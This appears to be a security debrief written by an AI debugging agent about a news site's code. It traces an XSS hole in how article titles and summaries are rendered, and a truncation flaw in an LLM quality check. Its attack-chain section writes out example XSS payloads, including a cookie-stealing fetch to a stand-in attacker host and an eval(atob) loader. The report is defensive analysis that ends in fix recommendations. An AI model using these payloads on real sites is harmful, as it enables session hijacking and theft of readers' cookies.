# Debugger Debrief — TrendWire Philippines

**Investigator**: Hermes Agent (debugger)
**Date**: 2026-07-10
**Scope**: Trace two medium-severity issues from source to impact:
1. XSS vector via `innerHTML` in app.js
2. Quality check content truncation (3000 chars) in quality-check/index.ts

---

## Issue 1: XSS Vector in app.js — Full Attack Chain

### Severity: Medium (depends on RLS posture)

### Data Flow: Database → Browser

```
LLM / Python Script → Supabase articles table → fetchArticleBySlug() → app.innerHTML
```

### Step-by-Step Trace

#### 1. Data Origin — How content enters the database

There are **three pathways** that write to the `articles` table:

| Pathway | Direct DB Write? | Escapes HTML? |
|---------|-----------------|---------------|
| `generate-article/index.ts` (Edge Function, LLM-generated) | Yes — inserts via Supabase JS client | No — LLM writes raw markdown, stored as-is |
| `publish-article.py` (Python script) | Yes — inserts via Supabase Python client | No — JSON file content stored as-is |
| `admin-operations/index.ts` (now-fixed unauthenticated endpoint) | Yes — via Supabase JS client | No — content stored as-is |

All three store `title`, `summary`, and `content` as **raw strings** in the database. No escaping happens at write time, which is correct — escaping should happen at render time.

#### 2. Database to Frontend

When a user navigates to `/article/<slug>`, the flow is:

```
app.js line 88: renderArticle(currentSlug)
  → line 2201: const article = await fetchArticleBySlug(slug)
    → line 305-317: sb.from('articles').select('*').eq('slug', slug).eq('status', 'published').maybeSingle()
  → line 2220: const content = article.content || ''
  → line 2221: const renderedContent = renderMarkdown(content)
  → line 2235: app.innerHTML = `...template with article fields...`
```

The entire article page is constructed as a **template literal string** and injected into the DOM via `innerHTML` at line 2235.

#### 3. InnerHTML Injection Points — What's Escaped vs. Not

| Line | Field | Escaped? | Escape Method | Risk |
|------|-------|----------|---------------|------|
| 2244 | `article.title` (breadcrumb) | ✅ | `escHtml()` | Safe |
| **2253** | **`article.title`** (h1) | **❌ NO** | **Raw** | **XSS** |
| 2255 | `article.author` (meta) | ✅ | `escHtml()` | Safe |
| 2264 | `article.summary` / `article.title` (img alt) | ✅ | `escHtml()` | Safe |
| **2271** | **`article.summary`** (summary box) | **❌ NO** | **Raw** | **XSS** |
| 2272 | `renderedContent` (body) | ✅ | `renderMarkdown()` escapes `<>&` first | Safe |
| 2251 | `article.category` (badge) | ❌ NO | Raw | Low (constrained values) |
| 1113 | `a.category` (hero carousel) | ❌ NO | Raw | Low (constrained values) |

**Key finding**: `article.title` and `article.summary` are rendered **raw into innerHTML** without sanitization. The codebase has `escHtml()` (line 2161) and uses it **inconsistently** — the breadcrumb title is escaped but the H1 title is not.

#### 4. The `renderMarkdown` Function — Actually Safe

```javascript
function renderMarkdown(content) {
  // Escape HTML first, then convert markdown
  let html = content
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
  // Then convert **text** → <strong>text</strong>
  // Then wrap in <p> tags
  return escapedAndWrappedHtml
}
```

Lines 2171-2175: HTML escaping runs **before** markdown-to-HTML conversion. Then the `**bold**` conversion and paragraph wrapping produce only `<strong>`, `<br>`, and `<p>` tags — all safe. The article body field (`content`) is **not** an XSS vector.

#### 5. The `escHtml` Function — Correct Implementation

```javascript
function escHtml(str) {
  const d = document.createElement('div')
  d.textContent = str
  return d.innerHTML
}
```

This DOM-based approach correctly encodes `<`, `>`, `&`, `"`, `'`. It's used in 20+ places for safe rendering but **missed on the two most important fields**: title (h1) and summary.

#### 6. Full Attack Chain

```
Step 1: Gain write access to the `articles` table
  └── Option A: Via the NOW-FIXED unauthenticated admin endpoint
      (the original admin-operations function had zero auth)
  └── Option B: Via the public Supabase anon key (exposed in app.js line 28)
      IF RLS policies on the `articles` table allow public INSERT/UPDATE
  └── Option C: Via SQL injection in any Edge Function input

Step 2: Set a malicious payload
  └── Write to the `title` or `summary` column:
      <img src=x onerror="fetch('https://evil.example.com/steal?c='+document.cookie)">
  └── OR: <svg/onload=eval(atob('...'))>
  └── OR: <script>document.location='https://evil.example.com/fake-login'</script>

Step 3: Exploitation
  └── Any reader navigating to the article page triggers renderArticle()
  └── app.innerHTML = `...${article.title}...` injects the payload
  └── Browser executes the script in the origin's security context
  └── Cookie theft, session hijacking, phishing, defacement, or redirection

Step 4: Stealth
  └── If the payload is injected into the summary (which appears below the
      featured image), the user sees a normal article with a hidden attack
      running in the background
```

#### 7. Actual Exploitability Assessment

| Condition | Exploitable? | Notes |
|-----------|-------------|-------|
| Before auth fix (admin endpoint accessible) | ✅ Yes | Anyone could write to articles via the unauthenticated admin endpoint |
| After auth fix, weak RLS on articles table | ✅ Yes | Anon key is public; if RLS allows writes, anyone can inject |
| After auth fix, strict RLS (read-only for anons) | ❌ No | Anon key can only read; an additional vector (SQLi) would be needed |
| Defense-in-depth measure (DOMPurify) | ❌ Missing | Even when DB is locked down, client-side sanitization is absent |

**Bottom line**: The XSS is real and the injection points are confirmed. Whether it's actively exploitable depends on Supabase RLS configuration, which is **not visible in this repo** (RLS policies live in the Supabase dashboard, not in code).

---

### Secondary XSS Vectors (Lower Risk)

| Location | Line | Field | Risk |
|----------|------|-------|------|
| Hero carousel category | 1113 | `a.category` | Low — category values are constrained |
| Article detail category badge | 2251 | `article.category` | Low — constrained values |
| Error message render | 529-534 | `e.message` | Low — error messages are from our own code/Supabase errors |

---

## Issue 2: Quality Check Truncation (3000 chars)

### Severity: Medium

### Location: `supabase/functions/quality-check/index.ts` line 163

### The Truncation

```typescript
// Line 150-163 of quality-check/index.ts
const llmPrompt = `...
CONTENT: ${content.slice(0, 3000)}
...`
```

The LLM quality evaluation prompt only includes the **first 3000 characters** of the article. Target articles are 600-800 words, approximately **4000-5500 characters** (at ~6.8 chars/word for English). The LLM sees roughly **55-70%** of the article.

### What the Full Content IS Checked For

| Check | Covers Full Content? | What It Looks For |
|-------|---------------------|-------------------|
| `checkForbidden(content, title)` | ✅ Yes (entire content) | Forbidden phrases like "google trends", "search volume" |
| `checkNaturalness(content)` | ✅ Yes (entire content) | Robotic transitions, sentence length distribution |
| `checkSpecificity(content)` | ✅ Yes (entire content) | Numbers, names, dates, locations, percentages |
| `checkStructure(content)` | ✅ Yes (entire content) | Paragraph count, bold usage, section labels, bullet points |
| `checkHeadlineFit(title, summary, content)` | ⚠️ **Partial** — first 200 chars for headline, first 500 for summary keywords | Headline words in content intro, summary claims in content |
| **LLM quality evaluation** | ❌ **Truncated to 3000 chars** | Naturalness, compliance, specificity, structure, headline fit |

### Where the Full Content Is NOT Checked

#### A) LLM Evaluation — 3000 chars (line 163)
- The LLM assesses 5 criteria: naturalness, compliance, specificity, structure, headline fit
- These scores are averaged into `llmScore` (line 191)
- `llmScore` contributes **70%** of the final score (line 206):
  ```typescript
  const overallBase = heuristicScore * 0.3 + llmWeighted * 0.7
  ```
- Issues in the last 30-45% of the article are invisible to the LLM

#### B) Headline Keyword Fit — 200 chars (line 24)
```typescript
const contentStart = content.slice(0, 200).toLowerCase()
// Only checks these first 200 chars for headline keyword presence
```
If headline keywords only appear after the 200th character, this check passes **falsely**.

#### C) Summary Keyword Fit — 500 chars (line 41)
```typescript
if (content.slice(0, 500).toLowerCase().includes(w)) {
```
If summary claims are only reflected after the 500th character, this also passes **falsely**.

### What This Means in Practice

```
Article (600-800 words / 4000-5500 chars)
├── First 3000 chars (~450-500 words)  →  LLM evaluates this portion      70% weight
├── Remaining 1000-2500 chars           →  NO LLM evaluation               0% weight
└── Heuristic checks (full content)     →  Still runs on everything        30% weight
```

**Risk scenarios** where the tail of the article could be problematic:

1. **LLM hallucinates in the conclusion** — the "BOTTOM LINE" section might contain fabricated claims that the LLM never sees
2. **Off-topic tangents in later paragraphs** — the article might drift off-topic after the first 3000 chars
3. **Contradictory statements** — the conclusion might contradict the introduction
4. **Forbidden phrases** — these ARE caught by the heuristic check (full content), so this risk is mitigated
5. **Robotic transitions** — also caught by heuristic on full content

### Is the Rest of the Article Getting Published Without Quality Review?

**No — the article is still reviewed.** The heuristic checks run on the **full content** and catch the most critical issues (forbidden phrases, structure problems, specificity, naturalness). But the **LLM's nuanced judgment** — which carries 70% of the score — only sees the truncated version.

The article IS published/rejected based on a score that's partially blind to the latter portion. An article with a perfect first half but a terrible conclusion could still pass.

### How the Publication Pipeline Works

There are **three publishing paths**, and the quality-check truncation affects them differently:

#### Path 1: generate-article → quality-check auto-publish
```
generate-article/index.ts
  → Saves article as 'draft' in DB
  → Fires fire-and-forget POST to quality-check (line 252-259)
    → quality-check/index.ts evaluates
    → If score >= 8.0: updates status to 'published' (line 244-247)
  → The fetch is fire-and-forget — if it fails, article stays 'draft' forever
```
**Truncation impact**: High — 70% of the score is based on truncated content

#### Path 2: publish-article.py (direct publish)
```
publish-article.py
  → Reads JSON draft from file
  → validate() — checks word count (600-800) and forbidden phrases
  → Directly inserts with status='published' (line 93)
  → Does NOT call quality-check Edge Function at all
```
**Truncation impact**: N/A — quality check is never called

#### Path 3: Admin dashboard (admin-operations)
```
admin-operations/index.ts
  → update-article action can flip status to 'published'
  → Does NOT call quality-check
```
**Truncation impact**: N/A — quality check is never called

### Why 3000 Characters Was Chosen

Likely a conservative limit to keep LLM prompt tokens low (3000 chars ≈ ~750 tokens, plus the prompt boilerplate ≈ 500-700 tokens → ~1250-1450 total). The LLM response format (`max_tokens: 500`) also suggests a concern about response time/cost. But this underestimated the actual article length (600-800 words = 4000-5500 chars).

---

## Summary Table

| Issue | Root Cause | Impact | Affected Paths |
|-------|-----------|--------|----------------|
| **XSS — title field** | `article.title` interpolated raw into innerHTML at line 2253 | Script execution in reader's browser | All article views |
| **XSS — summary field** | `article.summary` interpolated raw into innerHTML at line 2271 | Script execution in reader's browser | All article views |
| **Quality truncation — LLM** | `content.slice(0, 3000)` at line 163 | LLM misses issues in last 30-45% of article; 70% of score is blind | quality-check auto-publish path only |
| **Quality truncation — headline fit** | `content.slice(0, 200)` at line 24 | Headline keywords in later content are skipped | All quality-check paths |
| **Quality truncation — summary fit** | `content.slice(0, 500)` at line 41 | Summary claims in later content are skipped | All quality-check paths |
| **No quality check at all** | `publish-article.py` and admin-operations bypass quality-check | Articles can be published without any quality evaluation | Path 2 and Path 3 |

## Recommendations

1. **Fix XSS (High priority)**: Wrap `article.title` and `article.summary` in `escHtml()` at lines 2253 and 2271. Consider adding DOMPurify or a similar client-side sanitizer as defense-in-depth for the entire innerHTML template.

2. **Fix LLM truncation (Medium priority)**: Instead of `content.slice(0, 3000)`, send a representative sample: first 1500 chars + last 1500 chars (or first 1500 + middle 1000 + last 500). This gives the LLM both the introduction and conclusion.

3. **Fix heuristic truncation (Low priority)**: Expand `checkHeadlineFit` to scan the full content, not just the first 200/500 characters.

4. **Add quality check to all paths (Medium priority)**: Make `publish-article.py` and `admin-operations` call the quality-check function (or at least the heuristic checks) before publishing.
